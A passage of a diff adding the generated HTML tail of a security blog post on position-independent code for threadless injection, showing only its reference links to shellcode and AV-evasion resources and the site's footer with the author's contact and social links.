+  <li><a href="https://github.com/Idov31/FunctionStomping">https://github.com/Idov31/FunctionStomping</a></li>
+  <li><a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/">https://klezvirus.github.io/RedTeaming/AV_Evasion/FromInjectionToHijacking/</a></li>
+  <li><a href="https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/">https://rastating.github.io/altering-msfvenom-exec-payload-to-work-without-exitfunc/</a></li>
+  <li><a href="https://github.com/ommadawn46/win-x86-shellcoder">https://github.com/ommadawn46/win-x86-shellcoder</a></li>
+  <li><a href="https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode">https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode</a></li>
+</ul>
+
+  </div>
+<a class="u-url" href="/2023/02/14/pic-generation-for-threadless-injection.html" hidden=""></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">snovvcrash@gh-pages:~$ _</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Sam Freeside</li>
+<li><a class="u-email" href="mailto:snovvcrash%20-at-%20protonmail%20-dot-%20ch">snovvcrash -at- protonmail -dot- ch</a></li>
+</ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+<ul class="social-media-list">
+<li><a href="https://twitter.com/snovvcrash"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">snovvcrash</span></a></li>
+<li><a href="https://github.com/snovvcrash"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">snovvcrash</span></a></li>
+<li><a href="https://infosec.exchange/@snovvcrash"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#mastodon"></use></svg> <span class="username">snovvcrash</span></a></li>
+<li><a href="https://keybase.io/snovvcrash"><span class="svg-icon"><!--?xml version="1.0" encoding="utf-8"?-->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 71 76.3" style="enable-background:new 0 0 71 76.3;" xml:space="preserve">
+<style type="text/css">.st0{fill:#999999;}</style>
+<g transform="translate(-241.11756,-377.8123)">
+<path class="st0" d="M247.8,451.8c-0.6-1.3-1.4-3.1-1.8-4l-0.6-1.7l-2,2.2l-2,2.2 l-0.2-4.2c-0.3-6,0.2-12.2,1.2-16.6c2.3-9.8,9.5-18.7,18.8-23.4l2.1-1l-0.5-1.5c-0.3-0.8-0.6-2.5-0.7-3.6l-0.2-2.1l-2.1-0.2 c-3.2-0.3-4.9-1.2-6-3.5c-0.6-1.2-0.6-1.4-0.4-4.6c0.2-4.2,0.5-5.1,1.8-6.5c1.6-1.8,2.7-2.1,6.7-1.9c2.9,0.2,3.5,0.3,4.8,0.9 c0.8,0.4,1.5,0.8,1.6,0.8c0.1,0,1-1.1,2.1-2.6l1.9-2.7l1.2,0.7c0.7,0.4,1.5,0.9,1.9,1.1l0.7,0.4l-0.6,1.5c-0.3,0.8-0.7,2.2-0.8,2.9 l-0.2,1.4l1.7,0.2c6.1,0.6,10.7,4.3,12.4,9.9c0.5,1.8,0.5,5.3,0,7c-0.5,1.6-0.5,1.7-0.1,1.7c0.7,0,5.4,2.3,7.3,3.5 c3.7,2.4,8,6.6,10.4,10.2c4.5,6.7,6.4,14,5.6,22c-0.4,4.8-1.3,8.6-2.9,12.3l-0.6,1.4l-2.5,0l-2.5,0l1.2-2.4 c1.3-2.6,2.3-6.2,2.8-9.4c0.3-2.2,0.4-8.2,0.1-9.3l-0.2-0.7l-1.3,1.4c-3.2,3.5-7.9,4.5-14.2,2.8c-5.4-1.4-7.6-1.7-12.7-1.7 c-3.9,0-5.2,0.1-7.3,0.6c-5.8,1.3-9.9,3.2-15.6,7.3c-2.1,1.5-3.8,2.7-3.9,2.7c-0.1,0,0.2-1,0.6-2.3c0.4-1.3,1.1-3.4,1.5-4.8 l0.8-2.5l-0.9,0.9c-0.5,0.5-1.9,1.9-3.1,3.2l-2.1,2.3l0.5,1.9c0.6,2.5,2,5.6,3.5,7.9c0.6,1,1.1,1.8,1.1,1.9s-1.2,0.1-2.6,0.1h-2.6 L247.8,451.8L247.8,451.8z M256.6,427.6c4.8-5.1,8.7-9.2,8.8-9.2c0.1,0.1-0.4,1.6-0.9,3.3c-3.3,10.4-4,12.4-3.9,12.5 c0,0,1.2-0.4,2.5-0.9c8.5-3.7,18.4-4.2,28.9-1.4c4.7,1.2,6.5,1.2,8.8,0c1.3-0.7,1.8-1.1,2.4-2.1c1.1-1.7,1.2-4.1,0.5-6.3 c-1.7-4.8-8.3-11-14.5-13.7c-3.2-1.4-3.4-1.4-4.1-0.7l-0.6,0.6l2.6,3.2c1.4,1.7,2.9,3.6,3.1,4.1c0.6,1.2,0.7,3.1,0.1,4.3 c-0.8,1.7-3.2,2.9-5.1,2.5c-0.8-0.2-1.1-0.1-1.9,0.5c-2.2,1.6-4.6,1.2-6.6-1.2c-1.6-1.8-2-2.7-2.1-4.5c0-0.9-0.3-2-0.5-2.4 c-0.3-0.6-0.4-1.3-0.4-2.2l0.1-1.4l-1.3-0.3c-1.8-0.5-3.9-1.5-5.1-2.4c-0.6-0.4-1.1-0.8-1.3-0.8s-1.5,0.6-2.9,1.3 c-9.7,5-16,14.3-17,24.8c-0.1,1-0.2,2.3-0.3,2.8l-0.1,0.9l1.1-1.1C247.4,437.3,251.8,432.7,256.6,427.6L256.6,427.6z M282.5,420.2 c0.9-0.7,1.7-1.3,1.9-1.3c0.1,0,0.4,0.3,0.7,0.7c0.5,0.8,1.4,0.8,1.8,0.1c0.3-0.5,0.3-0.6-5.6-7.8c-3.5-4.3-4.2-5-4.7-5 c-1.2,0.1-0.9,1,1,3.3l1.8,2.2l-1,0.8c-1.1,1-1.2,1.2-0.5,1.8c0.5,0.5,0.6,0.4,1.6-0.3l1.1-0.7l0.7,0.6c0.4,0.3,0.6,0.8,0.6,0.9 c0,0.2-0.8,0.9-1.7,1.7c-0.9,0.7-1.6,1.5-1.6,1.7c0,0.3,0.5,1.1,1.4,2.2C280.3,421.7,280.8,421.5,282.5,420.2L282.5,420.2z  M272.2,406c0.6-1.8,2.6-3.2,4.6-3.2c1.1,0,2.7,0.9,3.8,2.1l1,1.2l0.9-1.1c2.5-2.8,2.8-6.7,0.8-10.1c-1.5-2.5-4.3-4-8.2-4.4 c-2.1-0.2-2.6-0.4-3.7-1.5l-0.8-0.8l-0.4,0.6c-0.8,1.2-2.5,5.1-3,6.6c-0.7,2.3-0.4,5.9,0.5,7.7c0.9,1.7,3.3,4,4,3.7 C271.8,406.9,272,406.5,272.2,406L272.2,406z M263.3,392.4c0.2-0.5,0.7-1.8,1.2-2.8c0.5-1,0.9-2,0.9-2.3c0-0.9-1-1.3-3.7-1.5 c-2.4-0.2-2.6-0.1-3.1,0.4c-0.4,0.4-0.6,0.9-0.6,1.6c0,0.6-0.1,1.7-0.2,2.6c-0.2,2.1,0.1,2.5,2.2,2.8 C263.1,393.4,263,393.4,263.3,392.4z M260.2,390c0-1.7,0.2-1.9,1.6-1.9h1.3v1.4v1.4h-1.4h-1.4V390z M266.5,448.3 c-0.6-0.6-0.8-1-0.8-2c0-1.9,1.1-3,2.9-3c1.7,0,2.9,1.2,2.9,2.9c0,1.8-1.1,2.8-3,2.9C267.5,449.1,267.1,448.9,266.5,448.3 L266.5,448.3z M285.8,448.6c-2.3-1.8-1.1-5.3,1.8-5.3c1.8,0,2.8,1.1,2.9,3c0,1.1-0.1,1.4-0.8,2s-1,0.8-2,0.8 C286.8,449.1,286.2,448.9,285.8,448.6L285.8,448.6z"></path>
+</g>
+</svg>
+</span> <span class="username">snovvcrash</span></a></li>
+</ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>High-Speed Pizza Delivery
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+
+</body></html>
